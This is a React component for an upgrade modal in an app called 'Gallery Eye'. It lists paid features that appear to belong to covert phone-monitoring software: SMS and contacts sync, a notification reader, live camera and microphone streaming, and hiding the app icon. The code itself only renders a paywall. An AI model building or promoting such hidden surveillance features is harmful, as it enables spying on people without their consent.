"use client";

import { Zap, Crown, Check } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

interface UpgradeModalProps {
    isOpen: boolean;
    onClose: () => void;
    feature: string;
    requiredPlan: 'standard' | 'premium';
    onViewPlans?: () => void;
}

const planConfig = {
    standard: {
        name: 'Standard',
        price: '$5',
        period: '/ year',
        accent: '#10b981',
        icon: <Zap size={24} />,
        features: [
            'Unlimited Photos & Videos',
            'SMS & Contacts Sync',
            'Notification Reader',
            'Torch & Vibration Control',
            'ZIP & Bulk Download',
            'Up to 5 Devices',
        ],
    },
    premium: {
        name: 'Premium',
        price: '$10',
        period: '/ year',
        accent: '#f59e0b',
        icon: <Crown size={24} />,
        features: [
            'Everything in Standard',
            'Live Camera Streaming',
            'Live Microphone & Recording',
            'Hide App Icon',
            'Up to 10 Devices',
            'All Permissions Unlocked',
        ],
    },
};

export default function UpgradeModal({ isOpen, onClose, feature, requiredPlan, onViewPlans }: UpgradeModalProps) {
    if (!isOpen) return null;
    const plan = planConfig[requiredPlan];
    const isPremium = requiredPlan === 'premium';

    const whatsAppLink = `https://wa.me/923460257488?text=${encodeURIComponent(`⚡ *Upgrade Request*\n\nI want the ${plan.name} plan (${plan.price}${plan.period}) for Gallery Eye.\n\nFeature needed: ${feature}\n\nPlease process my request! 🙏`)}`;

    return (
        <AnimatePresence>
            <div className="fixed inset-0 z-[700] flex items-center justify-center p-4" onClick={onClose}>
                <motion.div
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                    className="absolute inset-0 bg-black/80 backdrop-blur-md"
                />

                <motion.div
                    initial={{ opacity: 0, scale: 0.95, y: 20 }}
                    animate={{ opacity: 1, scale: 1, y: 0 }}
                    exit={{ opacity: 0, scale: 0.95, y: 20 }}
                    transition={{ type: 'spring', damping: 28, stiffness: 350 }}
                    className="relative w-full max-w-sm bg-gradient-to-b from-[#15161a] to-[#0f1013] border rounded-3xl overflow-hidden shadow-2xl"
                    style={{ borderColor: `${plan.accent}25` }}
                    onClick={e => e.stopPropagation()}
                >
                    {/* Glow */}
                    <div className="absolute top-0 left-1/2 -translate-x-1/2 w-48 h-32 rounded-full blur-3xl pointer-events-none" style={{ background: `${plan.accent}15` }} />

                    {/* Header */}
                    <div className="p-6 pb-4 text-center relative">
                        <div
                            className="w-14 h-14 rounded-2xl flex items-center justify-center mx-auto mb-4 border"
                            style={{
                                background: `${plan.accent}15`,
                                borderColor: `${plan.accent}30`,
                                color: plan.accent,
                                boxShadow: `0 0 25px ${plan.accent}20`,
                            }}
                        >
                            {plan.icon}
                        </div>
                        <p className="text-[10px] font-black tracking-[0.15em] uppercase mb-1" style={{ color: plan.accent }}>
                            {plan.name} Plan Required
                        </p>
                        <h2 className="text-lg font-bold text-white tracking-tight">{feature}</h2>
                        <p className="text-xs text-white/35 mt-1">Upgrade to unlock this feature</p>
                    </div>

                    {/* Features */}
                    <div className="px-5 pb-5">
                        <div className="bg-white/[0.03] border border-white/[0.06] rounded-2xl p-4 mb-5">
                            <p className="text-[10px] font-bold tracking-widest uppercase text-white/25 mb-3">{plan.name} includes</p>
                            <div className="space-y-2.5">
                                {plan.features.map((f, i) => (
                                    <div key={i} className="flex items-center gap-2.5">
                                        <Check size={13} className="flex-shrink-0" style={{ color: plan.accent }} />
                                        <span className="text-xs text-white/60">{f}</span>
                                    </div>
                                ))}
                            </div>
                            <div className="mt-4 pt-3 border-t border-white/[0.06] flex items-baseline gap-1">
                                <span className="text-xl font-black text-white">{plan.price}</span>
                                <span className="text-xs text-white/25">{plan.period}</span>
                            </div>
                        </div>

                        {/* Buttons */}
                        <button
                            onClick={onViewPlans || onClose}
                            className="w-full py-3.5 rounded-xl text-sm font-bold text-center transition-all flex items-center justify-center gap-2 mb-3"
                            style={{
                                background: plan.accent,
                                color: isPremium ? '#000' : '#fff',
                                boxShadow: `0 0 25px ${plan.accent}40`,
                            }}
                        >
                            {isPremium ? <Crown size={15} /> : <Zap size={15} />} View Plans & Upgrade
                        </button>
                        <button
                            onClick={onClose}
                            className="w-full py-2.5 rounded-xl text-xs font-medium text-white/30 hover:text-white/50 transition-colors"
                        >
                            Maybe later
                        </button>
                    </div>
                </motion.div>
            </div>
        </AnimatePresence>
    );
}
